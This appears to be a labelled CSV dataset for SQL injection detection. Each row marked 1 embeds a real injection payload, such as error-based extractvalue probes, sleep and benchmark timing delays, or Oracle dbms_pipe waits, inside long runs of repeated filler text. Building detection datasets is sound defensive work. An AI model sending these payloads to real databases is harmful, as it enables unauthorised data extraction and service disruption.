Query,Label
Tom got a small piece of pie. Tom got a small piece of pie.Tom got a small piece of pie. Tom got a small piece of pie.Tom got a small piece of pie. Tom got a small piece of pie.Tom got a small piece of pie. Tom got a small piece of pie.Tom got a small piece of pie. Tom got a small piece of pie.Tom got a small piece of pie. Tom got a small piece of pie.Tom got a small piece of pie. Tom got a small piece of pie.Tom got a small piece of pie. Tom got a small piece of pie.Tom got a small piece of pie. Tom got a small piece of pie.Tom got a small piece of pie. Tom got a small piece of pie.Tom got a small piece of pie. Tom got a small piece of pie.Tom got a small piece of pie. Tom got a small piece of pie.Tom got a small piece of pie. Tom got a small piece of pie.Tom got a small piece of pie. Tom got a small piece of pie.Tom got a small piece of pie. Tom got a small piece of pie.Tom got a small piece of pie. Tom got a small piece of pie.Tom got a small piece of pie. Tom got a small piece of pie.Tom got a small piece of pie. Tom got a small piece of pie.Tom got a small piece of pie. Tom got a small piece of pie.) and (select 2*(if((select * from (select concat(0x7171706a71 (select (elt(3484=3484 1))) 0x717a767a71 0x78))s)  8446744073709551610  8446744073709551610))) and (8450=8450,1
"saqrpbg saqrpbg saqrpbg saqrpbg saqrpbg saqrpbg saqrpbg saqrpbg saqrpbg saqrpbg saqrpbg saqrpbg saqrpbg saqrpbg saqrpbg saqrpbg saqrpbg saqrpbg saqrpbg saqrpbg saqrpbg saqrpbg saqrpbg saqrpbg "" and extractvalue(7982 concat(0x5c 0x7171706a71 (select (elt(7982=7982 1))) 0x717a767a71)) and ""okpa""=""okpa saqrpbg saqrpbg saqrpbg saqrpbg saqrpbg saqrpbg saqrpbg saqrpbg saqrpbg saqrpbg saqrpbg saqrpbg saqrpbg saqrpbg saqrpbg saqrpbg saqrpbg saqrpbgsbvgw saqrpbgsbvgw saqrpbgsbvgw saqrpbgsbvgw saqrpbgsbvgw saqrpbgsbvgw saqrpbgsbvgw saqrpbgsbvgw saqrpbgsbvgw saqrpbgsbvgw saqrpbgsbvgw saqrpbgsbvgw saqrpbgsbvgw saqrpbgsbvgw saqrpbgsbvgw saqrpbgsbvgw saqrpbgsbvgw saqrpbgsbvgw saqrpbgsbvgw saqrpbgsbvgw saqrpbgsbvgw saqrpbgsbvgw saqrpbgsbvgw saqrpbgsbvgw saqrpbgsbvgw saqrpbgsbvgw saqrpbgsbvgw saqrpbgsbvgw saqrpbgsbvgw saqrpbgsbvgw saqrpbgsbvgw saqrpbgsbvgw saqrpbgsbvgw saqrpbgsbvgw saqrpbgsbvgw saqrpbgsbvgw saqrpbgsbvgw saqrpbgsbvgw saqrpbgsbvgw saqrpbgsbvgw saqrpbgsbvgw saqrpbgsbvgw saqrpbgsbvgw saqrpbgsbvgw saqrpbgsbvgw saqrpbgsbvgw saqrpbgsbvgw saqrpbgsbvgw saqrpbgsbvgw saqrpbgsbvgw saqrpbgsbvgw saqrpbgsbvgw saqrpbgsbvgw",1
"ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss ""))) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((""fjwv"" like ""fjwv sssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss",1
"aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 "") or 8421=(select count(*) from generate_series(1 5000000)) and (""ctrr""=""ctrr aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4 aq59hn78rt4",1
phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 ') rlike (select (case when (9308=2540) then 1 else 0x28 end)) and ('rghd'='rghd phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469 phtorbg469,1
Siri became confused when we reused to follow her directionsSiri became confused when we reused to follow her directionsSiri became confused when we reused to follow her directionsSiri became confused when we reused to follow her directionsSiri became confused when we reused to follow her directionsSiri became confused when we ' in boolean mode);select benchmark(5000000 md5(0x4c4d6142))# reused to follow her directionsSiri became confused when we reused to follow her directionsSiri became confused when we reused to follow her directionsSiri became confused when we reused to follow her directionsSiri became confused when we reused to follow her directionsSiri became confused when we reused to follow her directionsSiri became confused when we reused to follow her directionsSiri became confused when we reused to follow her directionsSiri became confused when we reused to follow her directionsSiri became confused when we reused to follow her directionsSiri became confused when we reused to follow her directionsSiri became confused when we reused to follow her directions,1
"A thing long expected takes the form of the unexpected when at last it comes.A thing long expected takes the form of the unexpected when at last it comes.A thing long expected takes the form of the unexpected when at last it comes.A thing long expected takes the form of the unexpected when at last it comes "")) as ikuz where 7385=7385;select sleep(5)# .A thing long expected takes the form of the unexpected when at last it comes.A thing long expected takes the form of the unexpected when at last it comes.A thing long expected takes the form of the unexpected when at last it comes.A thing long expected takes the form of the unexpected when at last it comes.A thing long expected takes the form of the unexpected when at last it comes.A thing long expected takes the form of the unexpected when at last it comes.A thing long expected takes the form of the unexpected when at last it comes.A thing long expected takes the form of the unexpected when at last it comes.A thing long expected takes the form of the unexpected when at last it comes.A thing long expected takes the form of the unexpected when at last it comes.A thing long expected takes the form of the unexpected when at last it comes.A thing long expected takes the form of the unexpected when at last it comes.",1
The road leading to a goal does not separate you from the destination; it is essentially a part of it. The road leading to a goal does not separate you from the destination; it is essentially a part of it.The road leading to a goal does not separate you from the destination; it is essentially a part of it. '+(select 'rpbx' where 6748=6748 and elt(4249=4249 7259))+' The road leading to a goal does not separate you from the destination; it is essentially a part of it.The road leading to a goal does not separate you from the destination; it is essentially a part of it. The road leading to a goal does not separate you from the destination; it is essentially a part of it.The road leading to a goal does not separate you from the destination; it is essentially a part of it. The road leading to a goal does not separate you from the destination; it is essentially a part of it.The road leading to a goal does not separate you from the destination; it is essentially a part of it. The road leading to a goal does not separate you from the destination; it is essentially a part of it.The road leading to a goal does not separate you from the destination; it is essentially a part of it. The road leading to a goal does not separate you from the destination; it is essentially a part of it.,1
adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 '))) or exp(~(select * from (select concat(0x7171706a71 (select (elt(6270=6270 1))) 0x717a767a71 0x78))x)) and ((('jwbt'='jwbt adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1 adew1ef1,1
Every problem has a gift for you in its handsEvery problem has a gift for you in its handsEvery problem has where 1897=1897 and 6414=(select count(*) from rdb$fields as t1 rdb$types as t2 rdb$collations as t3 rdb$functions as t4))+' a gift for you in its handsEvery problem has a gift for you in its handsEvery problem has a gift for you in its handsEvery problem has a gift for you in its handsEvery problem has a gift for you in its handsEvery problem has a gift for you in its handsEvery problem has a gift for you in its handsEvery problem has a gift for you in its handsEvery problem has a gift for you in its handsEvery problem has a gift for you in its handsEvery problem has a gift for you in its handsEvery problem has a gift for you in its handsEvery problem has a gift for you in its handsEvery problem has a gift for you in its handsEvery problem has a gift for you in its handsEvery problem has a gift for you in its handsEvery problem has a gift for you in its handsEvery problem has a gift for you in its handsEvery problem has a gift for you in its handsEvery problem has a gift for you in its handsEvery problem has a gift for you in its hands,1
nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 where 2267=2267 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65) 5)-- nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9 nhtgfg8g9,1
"q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 "")));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101) 5) from dual and (((""%""="" q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56 q9h4y8o9o56",1
